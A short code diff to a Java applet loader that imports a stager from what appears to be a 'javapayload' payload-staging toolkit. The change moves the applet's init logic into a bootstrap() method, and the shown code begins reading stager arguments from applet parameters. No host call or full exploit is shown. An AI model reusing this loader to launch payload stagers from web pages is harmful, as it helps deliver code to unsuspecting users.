@@ -40,6 +40,10 @@ import javapayload.stager.Stager;
 
 public class AppletLoader extends Applet {
 	public void init() {
+		bootstrap();
+	}
+	
+	public void bootstrap() {
 		try {
 			final String[] args = new String[Integer.parseInt(getParameter("argc"))];
 			for (int i = 0; i < args.length; i++) {
